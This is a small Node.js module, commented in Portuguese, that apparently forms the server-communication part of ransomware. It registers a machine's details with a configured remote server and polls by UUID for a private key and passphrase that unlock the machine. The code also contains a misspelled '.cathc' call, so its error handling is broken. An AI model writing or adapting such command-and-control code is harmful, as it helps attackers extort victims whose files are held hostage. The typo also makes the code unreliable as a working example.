"use strict";
const axios = require("axios");     // pesq: axios
const { remoteServer } = require("../config");

class Connection {
    constructor(){
        this.http = axios.create({      // instancia axios
            baseURL: remoteServer
        });
    }


    async registerMachine(machineInfo) {
        return new Promise((resolve, reject) => {
            this.http.post('/', machineInfo)    // post = registr maquina
            .then(({ data }) => {  
                    resolve(data);
                })
                .catch(e => reject(e));   // pega erro
        });
    }


    async checkMachineStatus(uuid) {
        return new Promise((resolve, reject) => {
            this.http.get(`/?uuid=${uuid}`)     // get = info da maquina
            .then(({ data: { privateKey, passphrase } }) => {
                resolve({ privateKey, passphrase });    // privkey + passp maq desbloc
            })
            .cathc(e => reject(e));
        });
    }
}

module.exports = Connection;

//-3-4